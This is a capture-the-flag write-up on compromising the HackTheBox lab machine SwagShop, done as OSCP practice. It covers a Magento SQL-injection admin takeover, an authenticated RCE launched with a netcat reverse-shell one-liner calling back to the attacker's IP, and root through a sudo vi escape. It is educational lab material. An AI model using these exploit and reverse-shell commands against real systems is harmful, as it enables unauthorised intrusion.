# Introduction

---

SwagShop is an easy machine. I tried to solve it to get more practice for the OSCP exam. It has a rating of 4.1, which should be enough to showcase that the box must be good. 

So let’s jump into the enumeration of the machine.

# Enumeration

---

As always, I use Nmap to perform a port scan and then I enumerate all the interesting ports.

## Nmap Scan

---

Here is the simple scan of all ports:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/swagshop]
└─$ sudo nmap -p- -v -sS 10.10.10.140

```

On those two ports, I to a deep scan (with `-A` flag):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/swagshop]
└─$ sudo nmap -p 22,80 -A 10.10.10.140

I have also done a script scan with the vuln script of NSE:

```bash

http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http servers resources causing Denial Of Service.
|

|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```

There were a lot of possible XSS vulnerabilities, but I do not think that they will bring me any further. The script found a CVE, but that is just a DoS, not what I’m looking for.

## Web Server Enumeration

---

SSH does not need to be enumerated, so that leaves me with just the web server running on port 80. The first thing I do is a gobuster scan  (do not forget to add the host to the hosts file):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/swagshop]
└─$ gobuster dir -u http://swagshop.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,log,txt

An interesting path is [http://swagshop.htb/lib/Mage/Backup/](http://swagshop.htb/lib/Mage/Backup/) (which does not contain any backup, so it's also a rabbit hole). The other directories are not useful. I open the main page and try to create an account:

![Untitled](/assets/images/2022-01-26-swagshop/Untitled.png)

I can create an account. But that was also not as useful as I thought, because I couldn't do much after logging in as this user. So I search for an exploit for Magento (the shop site):

[Magento-Shoplift-SQLI/poc.py at master · joren485/Magento-Shoplift-SQLI](https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py)

I found this exploit, which might work. I do not know the exact version of the shop site, but this exploit seems that it should work for all versions.

# Exploitation

---

I download the exploit found above and execute it:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/swagshop]
└─$ python poc.py swagshop.htb            
WORKED
Check http://swagshop.htb/admin with creds ypwq:123
```

It seems to work, so I visit the admin page. Use this URL [http://swagshop.htb/index.php/admin](http://swagshop.htb/index.php/admin):

![Untitled](/assets/images/2022-01-26-swagshop/Untitled1.png)

With the credentials generated from the script, I could log in. Now, I can also use the authenticated RCE exploits. At the bottom of the page I see the version: `Magento ver. 1.9.0.0`

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/swagshop]

  Exploit: Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/37811
     Path: /usr/share/exploitdb/exploits/php/webapps/37811.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /hackthebox/oscp-prep/swagshop/37811.py
```

I already downloaded an exploit. Because I had problems with multiple python installations, I changed the script a little. I added parentheses in the print statements and it worked with python3. You also need to change the login credentials in the script:

```python
# Config.
username = 'ypwq'
password = '123'
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # Must be same as /app/etc/local.xml
```

Now, start a netcat listener and run the script again with this command:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/swagshop]
└─$ python magento_rce.py '[http://10.10.10.140/index.php/admin](http://10.10.10.140/index.php/admin)' "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 4444 >/tmp/f"
```

Now, I have a shell.

## User Flag

---

I have permissions to read the user flag:

```bash
www-data@swagshop:/home/haris$ cat user.txt
a448**************************c8
```

# Privilege Escalation

---

First, I upgrade my shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Press Ctrl + z and use this command, which will bring the shell to the foreground so that shortcuts will work.

```bash
stty raw -echo; fg
```

The shell is now upgraded and you can use Ctrl + c without closing it. I use sudo -l to list all commands that can be executed as the root user:

```
www-data@swagshop:/home/haris$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

I find an exploit on GTFOBins:

[vi | GTFOBins](https://gtfobins.github.io/gtfobins/vi/)

I use the command from the `sudo -l` output and add the `-c` flag from GTFOBins:

```bash
www-data@swagshop:/var/www/html$ sudo vi /var/www/html/a -c ':!/bin/sh'
```

A shell spawns, in which I have root permissions.

## Root Flag

---

I got root permissions so I can read the root flag:

```bash
root@swagshop:/home/haris# cat /root/root.txt
c2b0**************************21
```

# Conclusions

---

Initial access was a bit tricky but after I got the user shell on the system, I could easily privesc to root. The box was fun to solve and it was a confidence boost for the OSCP exam.

From the learning perspective, it did not teach me a lot.
